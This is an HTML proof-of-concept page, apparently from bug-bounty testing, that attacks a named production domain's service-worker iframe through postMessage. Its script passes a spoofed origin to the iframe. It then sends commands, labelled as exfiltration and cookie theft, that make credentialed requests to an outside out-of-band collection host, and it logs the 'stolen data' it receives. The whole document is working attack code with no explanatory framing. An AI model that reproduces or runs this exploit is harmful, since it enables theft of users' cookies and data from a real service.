<html>
<head>
  <meta charset="UTF-8" />
  <title>postMessage demo with open window</title>
</head>
<body>
  <!-- <button id="send">Open Page and Send Message</button> -->
  <!-- <iframe id="targetFrame" src="https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=http://127.0.0.1&path=badr" style="width:100%; height:500px;"></iframe> -->

  <script>

        // 1. Create iframe with spoofed origin
        const iframe = document.createElement('iframe');
        iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me&1p=1';
        document.body.appendChild(iframe);

        iframe.onload = () => {
            try {
                console.debug('[DEBUG] iframe loaded:', iframe.src);
                // 2. Send command to exfiltrate data
                const collectUrl = `https://pixudi2jjzxwbwh3jx4dy4e0mm769g38o.oast.site/badr`;
                const collectMsg = {
                    type: 1,
                    clientId: 'attacker-client',
                    command: {
                        commandType: 0,
                        params: {
                            url: collectUrl,
                            method: 0,
                            credentials: 'include',
                            templates: {},
                            processResponse: true
                        }
                    }
                };
                console.debug('[DEBUG] Sending collect message:', collectMsg);
                iframe.contentWindow.postMessage(collectMsg, '*');

                // 3. Or send tracking request with victim's cookies
                const stealMsg = {
                    type: 1,
                    clientId: 'attacker-client',
                    command: {
                        commandType: 0,
                        params: {
                            url: 'https://pixudi2jjzxwbwh3jx4dy4e0mm769g38o.oast.site/khalil',
                            method: 1, // POST
                            body: 'victim_data=sensitive',
                            credentials: 'include'
                        }
                    }
                };
                console.debug('[DEBUG] Sending steal message:', stealMsg);
                iframe.contentWindow.postMessage(stealMsg, '*');
            } catch (err) {
                console.error('[ERROR] Failed to send postMessage:', err);
            }
        };

        // 4. Listen for responses
        window.addEventListener('message', (e) => {
            console.debug('[DEBUG] Received message event:', e);
            if (e.origin !== 'https://tagging.wetransfer.com') {
                console.log('[INFO] Stolen data:', e.data);
            } else {
                console.log('[INFO] Message from trusted origin:', e.data);
            }
        });

  </script>
</body>
</html>